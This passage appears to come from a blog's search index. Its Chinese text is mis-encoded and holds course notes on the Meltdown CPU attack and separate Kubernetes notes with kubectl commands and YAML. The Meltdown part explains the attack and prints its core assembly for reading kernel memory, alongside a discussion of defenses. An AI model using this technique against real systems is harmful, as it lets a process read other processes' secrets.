","date":"2021-10-18","objectID":"/distributed-systems/:17:5","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Meltdown æ¦‚è¿° Meltdown çš„ç›®æ ‡åˆ™å’Œä¸Šè¿°ç›®æ ‡ä¸åŒï¼šæˆ‘ä»¬æƒ³è¦åœ¨ä¸€ä¸ªç”¨æˆ·æ€é root çš„è¿›ç¨‹ä¸­ï¼Œä»å¦ä¸€ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­è¯»å–æ•°æ®ã€‚å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè¦è¾¾åˆ°è¿™ä¸€ç›®çš„ï¼Œæˆ‘ä»¬åªè¦è¯»å–å†…æ ¸åœ°å€ç©ºé—´ä¸­å­˜æ”¾ç‰©ç†å†…å­˜æ˜ å°„çš„é‚£ä¸€å—åœ°å€ä¸Šçš„å€¼ï¼Œå…·ä½“è¯»å“ªé‡Œåªè¦ç»è¿‡ä¸€äº›è®¡ç®—å°±å¯ä»¥çŸ¥é“äº†ã€‚å›¾ 6 ä¸­çš„å®çº¿ç®­å¤´å°±ä½“ç°äº†è¿™ä¸€è¿‡ç¨‹ã€‚ åŒæ ·åˆ©ç”¨ Flush + Reloadï¼š åˆ†é… 256 é¡µï¼ˆ1 MBï¼‰è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œæ¸…ç©ºå…¶å¯¹åº”çš„ç¼“å­˜ è®© OS ä¸è¦åœ¨å‘ç”Ÿæ®µé”™è¯¯çš„æ—¶å€™ kill æ‰è‡ªå·±ï¼Œæ¯”å¦‚å¯ä»¥è‡ªå·±æ•è· SIGSEGV æ ¹æ®æƒ³è¦è¯»å–çš„å¦ä¸€ä¸ªè¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„ç›®æ ‡åœ°å€ï¼Œè®¡ç®—å‡ºå†…æ ¸åœ°å€ç©ºé—´ä¸­å¯¹åº”çš„ç›®æ ‡åœ°å€å¹¶è¯»å–ï¼ˆå½“ CPU å‘ç°è¯»å–çš„åœ°å€éæ³•æ—¶ï¼Œä¼šè§¦å‘æ®µé”™è¯¯ï¼Œåœæ­¢æ‰§è¡Œåç»­æŒ‡ä»¤ï¼‰ æ ¹æ®ä¸Šé¢è¯»å–çš„ç»“æœè®¡ç®—å‡ºåˆæ³•çš„ã€ä½äºè¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„åœ°å€å¹¶è¯»å–ï¼ˆç”±äºä¹±åºæ‰§è¡Œï¼Œæ­¤æ—¶å¯èƒ½è¿˜æ²¡æœ‰è§¦å‘æ®µé”™è¯¯ï¼‰ æœ€åï¼Œæˆ‘ä»¬ä¾æ¬¡è¯»æ¯ä¸€é¡µï¼Œå…¶ä¸­æœ‰ä¸€é¡µä¸Šçš„è¯»å–é€Ÿåº¦æ¯”å…¶ä»–é¡µéƒ½å¿«ï¼Œè¯´æ˜è¯¥é¡µçš„åºå·å°±æ˜¯ç¬¬ä¸‰æ­¥ä¸­è¯»å–åˆ°çš„å†…æ ¸åœ°å€ä¸Šçš„å€¼ è¿™ä¸€æ¦‚è¿°è¿˜æ˜¯æ¯”è¾ƒæŠ½è±¡çš„ï¼Œå› æ­¤æœ€å¥½é€šè¿‡ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥ç†è§£ Meltdownã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:6","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Byte-at-a-Time å‡è®¾æˆ‘ä»¬å·²ç»å®Œæˆäº†å‰ä¸¤æ­¥ï¼Œæ­¤æ—¶ rcx å­˜æ”¾äº†æˆ‘ä»¬æƒ³è¯»å–çš„å†…æ ¸åœ°å€ï¼Œrbx å­˜æ”¾äº† 256 é¡µåœ°å€ç©ºé—´çš„åŸºåœ°å€ã€‚ xorq %rax, %rax retry: movb (%rcx), %al shl %rax, $0xc jz retry movq (%rbx,%rax,1), %rbx é¦–å…ˆå°† rax ç½® 0ï¼Œæ¥ç€å°è¯•ä» rcx ä¸­è¯»å–ä¸€å­—èŠ‚åˆ° alï¼Œä¹Ÿå°±æ˜¯ rax ä½ä½ã€‚è¿™ä¸€æ­¥æœ€ç»ˆä¸€å®šä¼šå¼•å‘æ®µé”™è¯¯ï¼Œä½†ç”±äºä¹±åºæ‰§è¡Œçš„å­˜åœ¨ï¼ŒCPU æ­¤æ—¶å¯èƒ½è¿˜æ²¡æœ‰æ„è¯†åˆ°é—®é¢˜çš„ä¸¥é‡æ€§ã€‚CPU æŒ‰é¡ºåºæ‰§è¡Œç¬¬ä¸‰è¡Œå’Œç¬¬å››è¡Œï¼Œä½†ç¬¬å››è¡Œå¯èƒ½åœ¨ç¬¬ä¸‰è¡Œä¹‹å‰æ‰§è¡Œå®Œã€‚ åœ¨ç¬¬å››è¡Œï¼Œæˆ‘ä»¬æ‰§è¡Œ rax = rax\u003c\u003c12ï¼Œå°±æ˜¯å°†è¯»å–åˆ°çš„åœ°å€ä¹˜ä»¥é¡µçš„å¤§å° 4Kã€‚å¦‚æœè¿æ°”ä¸å¥½ï¼Œåœ¨æ‰§è¡Œç¬¬å››è¡Œå‰å°±æ®µé”™è¯¯äº†ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨ç¬¬äº”è¡Œ jz åˆ°å‰é¢é‡è¯•ï¼Œæœ€ç»ˆä¸€å®šèƒ½æˆåŠŸã€‚ åˆ°äº†ç¬¬å…­è¡Œï¼Œæˆ‘ä»¬å…ˆè®¡ç®— rbx + raxï¼Œè¿™æ˜¯ç¬¬ rax é¡µçš„èµ·å§‹åœ°å€ï¼›ç„¶åä»è¿™ä¸ªåœ°å€ä¸Šè¯»å–ä¸€ä¸ªå€¼ç»™ rbxï¼Œä¸ºçš„å°±æ˜¯è®©è¿™ä¸€é¡µè¿›å…¥ç¼“å­˜ã€‚ç¬¬å››è¡Œå’Œç¬¬å…­è¡Œå¯¹åº”äº†ä¸Šæ–‡çš„ç¬¬å››æ­¥ã€‚ æœ€åï¼Œåªè¦ä¾æ¬¡è¯»æ¯ä¸€é¡µï¼Œåœ¨ç¼“å­˜é‡Œçš„é‚£é¡µå¿…å®šä¼šå¿«å¾ˆå¤šï¼Œä»è€Œå¯ä»¥ç”±å…¶åºå·æ¨å‡º rax\u003e\u003e12 çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ rcx çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¯»çš„åœ°å€ä¸Šå­˜æ”¾çš„å€¼ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:7","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Bit-at-a-Time å¯ä»¥çœ‹åˆ°ï¼Œä¸ºäº†è·å–å†…æ ¸ä¸­çš„ä¸€å­—èŠ‚ï¼ŒByte-at-a-Time éœ€è¦æ‰« 256 é¡µçš„å†…å­˜ï¼Œè¿™æ‰€éœ€è¦çš„æ—¶é—´è¿œè¿œå¤§äºè¿è¡Œ Meltdown æ ¸å¿ƒä»£ç çš„æ—¶é—´ã€‚Bit-at-a-Time æ”¹è¿›äº†è¿™ä¸€ç‚¹ï¼Œåœ¨è¯»åˆ°å†…æ ¸å†…å­˜ä¸­çš„ä¸€å­—èŠ‚åï¼Œå°†å…¶åˆ†ä¸º 8 ä¸ª bitã€‚å¯¹æ¯ä¸ª bit æ‰§è¡Œç±»ä¼¼çš„æ“ä½œï¼Œè¿™æ ·å¦‚æœè¯¥ä½æ˜¯ 0ï¼Œé‚£ä¹ˆç¬¬ 0 é¡µè¿›å…¥ç¼“å­˜ï¼›å¦‚æœè¯¥ä½æ˜¯ 1ï¼Œé‚£ä¹ˆç¬¬ 1 é¡µè¿›å…¥ç¼“å­˜ã€‚ åœ¨æ¯æ¬¡æ‰«ææ—¶ï¼Œæˆ‘ä»¬å°±åªéœ€è¦è¯»ä¸€ä¸‹ç¬¬ä¸€é¡µï¼šå¦‚æœè¾ƒå¿«ï¼Œé‚£ä¹ˆè¯¥ä½å°±æ˜¯ 1ï¼Œå¦åˆ™å°±æ˜¯ 0ã€‚é’ˆå¯¹æ¯ä¸ª bit åšç±»ä¼¼æ‰«æï¼Œä½¿å¾—è¯»å–å†…æ ¸å†…å­˜ä¸­çš„ä¸€å­—èŠ‚åªéœ€è¦ 8 æ¬¡æ‰«æè€Œä¸æ˜¯ 256 æ¬¡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:8","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"é˜²å¾¡ è½¯ä»¶æ–¹æ³•ï¼šé€šè¿‡ KPTI ä¿®æ”¹å†…æ ¸ï¼Œä¸å†å°†å†…æ ¸åœ°å€ç©ºé—´æ˜ å°„åˆ°è¿›ç¨‹å†…å­˜ä¸­ï¼Œè€Œæ˜¯åªåœ¨ syscall æ—¶è¿™ä¹ˆåšï¼Œæ€§èƒ½å¼€é”€æµ®åŠ¨è¾ƒå¤§ ç¡¬ä»¶æ–¹æ³•ï¼šä¿®æ”¹ CPUï¼Œä½¿å¾—è¯»å–å†…å­˜æ—¶æ£€æŸ¥ç›®æ ‡åœ°å€æ˜¯å¦åˆæ³•ï¼Œè¿™ä¸€æ–¹æ³•ä¾ç„¶ä¼šé­å—ä¸€ç§ç±»ä¼¼çš„åä¸º Fallout çš„æ”»å‡» ","date":"2021-10-18","objectID":"/distributed-systems/:17:9","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å‚è€ƒèµ„æ–™ Design and Implementation of the Sun Network Filesystem Memory coherence in shared virtual memory systems Paxos Made Simple Managing Update Conflicts in Bayou, a Weakly Connected Replicated Storage System The Google File System Eliminating Receive Livelock in an Interrupt-driven Kernel Kerberos: An Authentication Service for Open Network Systems Authentication in the Taos Operating System Smashing The Stack For Fun And Profit Exploiting Format String Vulnerabilities Once upon a free() Dynamic Taint Analysis for Automatic Detection, Analysis, and Signature Generation of Exploits on Commodity Software PaX Overview ASLR Overview On the Effectiveness of Address-Space Randomization Efficient Software-Based Fault Isolation Building Secure High-Performance Web Services with OKWS Meltdown: Reading Kernel Memory from User Space ","date":"2021-10-18","objectID":"/distributed-systems/:18:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["äº‘"],"content":"åœ¨äº†è§£äº† Kubernetes ä¸ºä»€ä¹ˆå« K8s ä¹‹åï¼Œæ‰æ˜ç™½ internationalization ä¸ºä»€ä¹ˆå« i18nã€‚ åœ¨ äº‘åŸç”ŸæŠ€æœ¯åŸç† ä¸€æ–‡ä¸­æˆ‘è®°å½•äº†ä¸€äº› K8s åŸºç¡€çŸ¥è¯†å’Œæ“ä½œï¼Œè¿™ç¯‡ç¬”è®°é‡Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚æ–‡ç« ä¸­æ¶‰åŠçš„èµ„æºåç§°ã€é•œåƒåç§°ã€é•œåƒæ ‡ç­¾ç­‰å‡ä¸ºè™šæ„ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:0:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æ“ä½œç°æœ‰æœåŠ¡ ","date":"2021-10-10","objectID":"/kubernetes/:1:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æ‰©ç¼©å®¹ k scale deploy/nginx --replicas=4 # scale up k scale deploy/nginx --replicas=2 # scale down ","date":"2021-10-10","objectID":"/kubernetes/:1:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æ»šåŠ¨æ›´æ–° k set image deploy/nginx nginx=docker.io/nginx:v2 æ»šåŠ¨æ›´æ–°ä¼šé‡æ–°åˆ›å»º ReplicaSet è¿›è€Œåˆ›å»ºæ–°çš„ Podã€‚å…³äºæ»šåŠ¨æ›´æ–°ï¼Œæœ‰ä¸¤ä¸ªé‡è¦å‚æ•° maxSurge å’Œ maxUnavailable ï¼Œå‚è§ [åæ–‡](# æ»šåŠ¨æ›´æ–°æ£€æŸ¥)ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:1:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"ç‰ˆæœ¬å›é€€ åœ¨åˆ›å»º / ä¿®æ”¹èµ„æºæ—¶ï¼Œè®°å¾—æ·»åŠ  --recordï¼Œè¿™æ ·å°±å¯ä»¥ç•™ä¸‹ revision è®°å½•å¹¶æŸ¥è¯¢ï¼š k rollout history deploy/nginx éšåå°±èƒ½å›é€€åˆ°æŸä¸ªç‰¹å®šç‰ˆæœ¬ï¼š k rollout undo deploy/nginx --to-revision=1 å¦‚æœä¸åŠ å‚æ•°ï¼Œåˆ™å›é€€åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:1:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"åŸºç¡€æ¦‚å¿µ ","date":"2021-10-10","objectID":"/kubernetes/:2:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"åˆ›å»º Deployment çš„è¿‡ç¨‹ kubectl è¿™ä¸ª CLI æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª REST å®¢æˆ·ç«¯ï¼Œä¸»è¦ä»»åŠ¡æ˜¯å‘ Kubernetes API Server å‘é€è¯·æ±‚ã€‚ å®é™…ä¸Šï¼Œä¸å°‘ CLI éƒ½æ˜¯è¿™æ ·çš„ï¼Œä¾‹å¦‚ docker å’Œ gcloud ç­‰ã€‚ API Server éšåé€šçŸ¥ Deployment Controller åˆ›å»º ReplicaSetï¼Œå†é€šè¿‡ ReplicaSet åˆ›å»ºå¤šä¸ª Podï¼Œè¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥ä»ä¸‰ç§èµ„æºçš„å‘½åæ–¹å¼ä¸­å‘ç°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœ Deployment å«åš nginxï¼Œé‚£ä¹ˆ ReplicaSet åç§°åˆ™å½¢å¦‚ nginx-7848d4b86fï¼Œè€Œ Pod åç§°åˆ™å½¢å¦‚ nginx-7848d4b86f-2ht2lã€‚ å¦ä¸€ç§éªŒè¯è¿™ä¸€ç‚¹çš„æ–¹æ³•æ˜¯æŸ¥çœ‹ describe å‘½ä»¤è¿”å›çš„ Controlled By å­—æ®µã€‚ åŒä¸€ä¸ª Pod ä¸­çš„å®¹å™¨è”ç³»éå¸¸ç´§å¯†ï¼Œå¹¶ä¸”éœ€è¦å…±äº«èµ„æºï¼Œæ¯”å¦‚ç½‘ç»œå’Œ volumeã€‚ Pod åˆ›å»ºåï¼ŒScheduler å°† Pod çš„å‰¯æœ¬åˆ†é…åˆ°ä¸åŒçš„ Node ä¸Šè¿è¡Œã€‚å½“æˆ‘ä»¬ç”¨ kubectl æŸ¥è¯¢éƒ¨ç½²çš„æœåŠ¡ä¿¡æ¯æ—¶ï¼Œä¹Ÿæ˜¯é€šè¿‡è¯·æ±‚ API Server ä» etcd ä¸­è¯»å–æœåŠ¡çš„ä¿¡æ¯ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:2:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"è®¿é—® Service çš„æ–¹å¼ å¦‚æœæœªæŒ‡å®š typeï¼Œåˆ™ Service åªèƒ½ä» Cluster å†…éƒ¨é€šè¿‡ ClusterIP è®¿é—®ã€‚è®¿é—® Service çš„æµé‡é€šè¿‡ iptables è§„åˆ™è½®è¯¢è½¬å‘åˆ° Podã€‚ é™¤äº† IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Kubernetes æä¾›çš„ DNS æœåŠ¡ä» Cluster å†…éƒ¨è®¿é—® Serviceã€‚ä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªä¸´æ—¶çš„ Podï¼š k run busybox --rm -it --image=busybox /bin/sh åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œ wget nginx-svc.default:8080ï¼Œå¯ä»¥è·å–åˆ°ç½‘é¡µå†…å®¹ï¼›å¦‚æœå®¹å™¨ä¸ Service åŒå¤„äºä¸€ä¸ª Namespaceï¼ˆå¦‚ defaultï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥çœç•¥æ‰ .default è¿™ä¸€ Namespace å£°æ˜ã€‚ è€Œå¦‚æœè¦ä» Cluster å¤–éƒ¨è®¿é—® Serviceï¼Œå°±éœ€è¦è®¾ç½® type ä¸º NodePort æˆ– LoadBalancerã€‚å‰è€…é€šè¿‡ iptables å°†ç«¯å£æ˜ å°„åˆ°æ‰€åœ¨ Node çš„ç«¯å£ä¸Šï¼Œåè€…åˆ™ä½¿ç”¨äº‘æœåŠ¡å•†çš„ Load Balancer å¯¹æµé‡è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:2:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"DaemonSet DaemonSet éƒ¨ç½²çš„ Pod åœ¨æ¯ä¸ª Node ä¸Šæœ€å¤šåªèƒ½è¿è¡Œä¸€ä¸ªå‰¯æœ¬ï¼Œé€‚åˆç›‘æ§å’Œæ—¥å¿—æ”¶é›†ç­‰ç±»ä¼¼å®ˆæŠ¤è¿›ç¨‹çš„æœåŠ¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒDaemonSet éƒ¨ç½²çš„ Pod ä¼šç»•è¿‡è°ƒåº¦å™¨å¹¶å¿½ç•¥èŠ‚ç‚¹çš„ Unschedulable å±æ€§ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:2:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Job Job ä¸­é…ç½®çš„ä»»åŠ¡åœ¨å®¹å™¨ä¸­åªä¼šè¿è¡Œä¸€æ¬¡ï¼Œå®Œæˆä¹‹åå®¹å™¨å°±ä¼šåœæ­¢ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:2:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å¸¸ç”¨èµ„æº YAML ","date":"2021-10-10","objectID":"/kubernetes/:3:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Deployment å’Œ Service æ›´å¸¸ç”¨ä¹Ÿæ›´æ–¹ä¾¿çš„åˆ›å»º / ä¿®æ”¹æœåŠ¡çš„æ–¹æ³•æ˜¯ä½¿ç”¨ yaml æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š apiVersion:apps/v1kind:Deploymentmetadata:# metadata for deploymentname:nginx # required metadataspec:# specification for deploymentselector:matchLabels:app:nginxreplicas:3template:# pod templatemetadata:# metadata for podlabels:app:nginx# at least one label requiredspec:# specification for podcontainers:- name:nginximage:nginxports:- containerPort:80 ç„¶åè¿è¡Œ k apply -f nginx-deploy.yml å°±å¯ä»¥åˆ›å»º Deploymentï¼Œæˆ–æ˜¯ä¿®æ”¹ç°æœ‰çš„ Deploymentã€‚åˆ é™¤çš„è¯ï¼ŒæŠŠ apply æ¢æˆ delete å³å¯ã€‚ å¯¹äº Service æ¥è¯´åŒç†ï¼Œå¯ä»¥ç¼–å†™ nginx-service.ymlï¼š apiVersion:v1kind:Servicemetadata:name:nginx-svcspec:type:NodePort # map to a port on the Nodeselector:app:nginx # select pods according to labelsports:- protocol:TCPnodePort:30000# Node:30000port:8080# ClusterIP:8080targetPort:80# pod:80 å¯ä»¥å‘ç°ï¼ŒService é€šè¿‡ labels æ¥ç­›é€‰ Podã€‚åŒæ ·åœ°ï¼ŒPod ä¹Ÿå¯ä»¥é€šè¿‡ labels æ¥ç­›é€‰ Nodeï¼š k label node node1 disktype=ssd k get node --show-labels éšååœ¨ nginx-deploy.yml ä¸‹çš„ .spec.template.spec ä¸‹æ·»åŠ ï¼š nodeSelector:diskType:ssd å°±å¯ä»¥ç¡®ä¿è¯¥ Deployment çš„æ‰€æœ‰ Pod éƒ½è¢«åˆ†é…åˆ°æŒ‡å®š Node ä¸Šã€‚å½“ç„¶ä¹Ÿå¯ä»¥åˆ é™¤ Node ä¸Šçš„ labelsï¼š k label node node1 disktype- ","date":"2021-10-10","objectID":"/kubernetes/:3:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Job apiVersion:batch/v1kind:Jobmetadata:name:pispec:completions:4parallelism:2template:# pod templatespec:containers:- name:piimage:perlcommand:[\"perl\",\"-Mbignum=bpi\",\"-wle\",\"print bpi(2000)\"]restartPolicy:NeverbackoffLimit:4 Job è¯­æ³•å¤§åŒå°å¼‚ï¼Œparallelism æ§åˆ¶å¹¶è¡Œ Pod æ•°é‡ï¼Œcompletions æ§åˆ¶ä»»åŠ¡æ€»å…±éœ€è¦å®Œæˆå¤šå°‘æ¬¡ï¼Œ restartPolicy å¯¹ Job è€Œè¨€åªèƒ½æ˜¯ Never æˆ– OnFailureï¼ŒbackoffLimit é™åˆ¶äº†æœ€å¤§çš„é‡è¯•æ¬¡æ•°ã€‚ restartPolicy å¯¹ Deployment è€Œè¨€è¿˜å¯ä»¥æ˜¯ Alwaysï¼Œæ­¤æ—¶å³ä½¿å®¹å™¨è¿›ç¨‹è¿”å›äº† 0 ä¹Ÿä¾ç„¶ä¼šé‡å¯å®¹å™¨ã€‚ å¦‚æœä»»åŠ¡è¿è¡Œå¤±è´¥ï¼Œç”±äº restartPolicy ä¸º Neverï¼Œå®¹å™¨ä¸ä¼šè¢«é‡å¯ï¼Œä½†ä¼šä¸æ–­åˆ›å»ºæ–°çš„ Pod é‡æ–°è¿è¡Œï¼›å¦‚æœ restartPolicy ä¸º OnFailure ï¼Œç”±äºå®¹å™¨ä¼šè¢«é‡å¯ï¼Œå› æ­¤ä¸ä¼šåˆ›å»ºæ–°çš„ Podã€‚ è¦æŸ¥çœ‹å·²å®Œæˆ Job çš„æ‰§è¡Œç»“æœï¼Œå‡è®¾ Pod åç§°ä¸º pi-trvkrï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ k logs pi-trvkrã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå’Œ Istio ä¸€èµ·ä½¿ç”¨æ—¶ä¼šå—åˆ° Sidecar æ³¨å…¥å½±å“ï¼ŒKubernetes ä¼šè®¤ä¸º Job æ²¡æœ‰æ‰§è¡Œå®Œæˆï¼Œä½†å®é™…ä¸Š Job çš„æ‰§è¡Œå¹¶æ²¡æœ‰å—åˆ°å½±å“ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå¯ä»¥åœ¨ Pod æ¨¡ç‰ˆä¸­å…³é—­ Sidecar æ³¨å…¥ï¼Œå³åœ¨ .spec.template ä¸‹æ·»åŠ ï¼š metadata:annotations:sidecar.istio.io/inject:'false' ","date":"2021-10-10","objectID":"/kubernetes/:3:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CronJob å®šæ—¶ä»»åŠ¡å®é™…ä¸Šæ˜¯åœ¨ Job å¤–é¢å¥—äº†ä¸€å±‚ specï¼Œä¸»è¦æ˜¯ä¸ºäº†å¢åŠ  schedule å­—æ®µï¼Œå…¶æ ¼å¼å’Œ crontab çš„æ ¼å¼ç›¸åŒï¼š apiVersion:batch/v1kind:CronJobmetadata:name:hellospec:schedule:\"*/1 * * * *\"jobTemplate:spec:template:# pod templatespec:containers:- name:helloimage:busyboximagePullPolicy:IfNotPresentcommand:- /bin/sh- -c- date; echo Hello from the Kubernetes clusterrestartPolicy:OnFailure åŒç†ï¼ŒCronJob ä¹Ÿå­˜åœ¨å’Œ Sidecar å†²çªçš„é—®é¢˜ï¼Œè§£å†³æ–¹æ³•å’Œä¸Šè¿°ä¸€è‡´ï¼Œæ’å…¥ä½ç½®æ˜¯ .spec.jobTemplate.spec.template ä¸‹ã€‚ ä»èµ„æºåç§°åŒæ ·å¯ä»¥çœ‹å‡ºè¿™é‡Œçš„å±‚çº§å…³ç³»ï¼šCronJobï¼ˆhelloï¼‰-\u003e Jobï¼ˆhello-27231469ï¼‰-\u003e Podï¼ˆhello-27231469-bjbjwï¼‰ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:3:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Health Check é»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨è¿è¡Œçš„è¿›ç¨‹è¿”å›é 0 æ—¶ï¼ŒKubernetes ä¼šè®¤ä¸ºå‡ºç°äº†é”™è¯¯ï¼Œæ­¤æ—¶ Health Check ä¸é€šè¿‡ã€‚ç„¶è€Œå‡ºç°é”™è¯¯æ—¶å®¹å™¨å†…è¿›ç¨‹æœªå¿…ä¼šè¿”å›ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ Health Check çš„è§„åˆ™ã€‚ ä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ªå¸¦ livenessProbe çš„ Podï¼š apiVersion:v1kind:Podmetadata:name:livenesslabels:test:livenessspec:restartPolicy:OnFailurecontainers:- name:livenessimage:busyboxargs:- /bin/sh- -c- touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600livenessProbe:exec:command:- cat- /tmp/healthyinitialDelaySeconds:10# start probing after 10speriodSeconds:5# probe every 5s è¿™é‡Œå°±æ˜¯é€šè¿‡ exec äº† cat /tmp/healthy è¿”å›å€¼æ˜¯å¦ä¸º 0 æ¥åˆ¤æ–­å®¹å™¨æ˜¯å¦å­˜æ´»ï¼Œå¦‚æœä¸‰æ¬¡æ¢æµ‹å‡å¤±è´¥ï¼Œåˆ™ä¼šè®¤ä¸ºå‘ç”Ÿäº† Failureï¼Œè§¦å‘ OnFailure é‡å¯å®¹å™¨ã€‚å¯ä»¥æŸ¥çœ‹æ—¥å¿—ç¡®è®¤è¿™ä¸€ç‚¹ï¼š Warning Unhealthy 2s (x3 over 12s) kubelet Liveness probe failed: cat: can't open'/tmp/healthy': No such file or directory Normal Killing 2s kubelet Container liveness failed liveness probe, will be restarted Liveness æ¢æµ‹ä¸»è¦ç”¨æ¥é€šçŸ¥ Kubernetes å°è¯•é‡å¯å®¹å™¨ï¼Œè€Œå¦ä¸€ç§ Health Check æœºåˆ¶ Readiness æ¢æµ‹åˆ™ç”¨æ¥é€šçŸ¥ Kubernetes å®¹å™¨å·²ç»å¯ä»¥æ­£å¸¸æä¾›æœåŠ¡äº†ã€‚å’Œ Liveness æ¢æµ‹è¯­æ³•ä¸Šçš„å”¯ä¸€åŒºåˆ«å°±æ˜¯æŠŠ livenessProbe æ”¹æˆ readinessProbeã€‚Readiness æ¢æµ‹ï¼Œä»ç°è±¡ä¸Šçœ‹ï¼Œå½±å“çš„æ˜¯ Pod çš„ READY çŠ¶æ€ã€‚ è€Œ Startup æ¢æµ‹é€‚ç”¨äºå¯åŠ¨æ—¶é—´è¾ƒé•¿çš„åº”ç”¨ï¼Œåœ¨ READY å‰ä»¥ä¸€ä¸ªæ›´ä½çš„é¢‘ç‡è¿›è¡Œ Readiness Checkï¼Œé¿å…é«˜é¢‘æ£€æµ‹å½±å“åº”ç”¨å¯åŠ¨ã€‚ 